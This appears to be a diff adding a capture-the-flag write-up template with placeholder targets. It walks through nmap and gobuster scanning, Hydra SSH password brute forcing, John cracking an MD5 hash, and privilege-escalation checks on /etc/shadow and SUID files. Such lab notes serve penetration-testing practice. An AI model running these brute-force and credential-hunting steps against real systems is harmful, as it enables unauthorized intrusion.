@@ -1,0 +1,70 @@
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+● DATE : 07/07/07 | 07:07				          
+● ROOM : THE FIRST CTF KEYS                                     
+● VPN  : x.x.x.x                                                   
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+
+[ INFO ] - TARGET
+	-> IP     : x.x.x.x 
+	-> DOMAIN : xxxxxxxx.thm
+		
+............................
+[ PHASE 1 ] - RECONNAISSANCE
+............................
+
+	-> NMAP | $ nmap -sC -sV -p- -v x.x.x.x  	
+          	Discovered open port 22/tcp   : SSH  - OpenSSH 7.2p2
+	  		Discovered open port 8080/tcp : HTTP - Apache TOmcat 9.0.7 
+          	Discovered open port 139/tcp  : SMB  - Samba smbd 3.X 
+	  		Discovered open port 445/tcp  : SMB  - Samba smbd 4.X
+	  		Discovered open port 80/tcp   : HTTP - Apache httpd 2.4.18	
+		
+	-> GOBUSTER | $ gobuster dir -u x.x.x.x -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html
+		    	/development
+		    	/login
+		    
+	-> FINDINGS | INFORMATIONS FOUND ON THE HTTP 
+		    	- index.html - Page Source : <!-- User password is weak --> | We can try to brute force the user password
+		   	    - secret.html - Page : s3cr3t.png | There's a weird picture, We can try to check whether steganography has been used.
+	   
+	            | INFORMATIONS FOUND ON THE SMB 
+		    	- Anonymous share - pass.txt : 5f4dcc3b5aa765d61d8327deb882cf99 | We can try to break this hash	 
+		    
+        [ ! ] Now that we've got enough information, we can start the exploitation.
+		    
+..........................
+[ PHASE 2 ] - EXPLOITATION
+..........................
+
+	-> HYDRA | $ hydra -l user -P /usr/share/wordlists/rockyou.txt x.x.x.x ssh
+		 	 [22][ssh] host: x.x.x.x login: user password: ctf
+
+	-> JOHN | $ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-MD5
+			5f4dcc3b5aa765d61d8327deb882cf99:password
+		
+	-> SSH | $ ssh user@x.x.x.x  	
+	         
+	[ ! ] We got our initial acces, it's time to elevate privileges
+
+.....................................	
+[ PHASE 3 ] - TOTAL CONTROL & EVASION
+.....................................
+
+	This phase can be different depending on the CTF, in this phase we make a reconnaissance again, 
+	we can check :  
+		- If there are users in the folder "/home", 
+		- If there are authorization problems on the file "/etc/shadow", 
+		- If we are part of a particular group with the command "id", 
+		- The files with the SUID with the command "find / -type f -perm -4000 2>/devl/null". 
+		
+	[ ! ] This reconnaissance can be automated using scripts such as "linPEAS" for linux and "winPEAS" for windows.
+
+.....................................
+
+[ ★ ] - CREDENTIALS
+	-> SSH  : user:ctf
+	-> HTTP : admin:password
+
+[ ★ ] - FLAGS
+	-> USER : flag{1234567891011121314151617181920} 
+    -> ROOT : flag{2019181716151413121110987654321}         
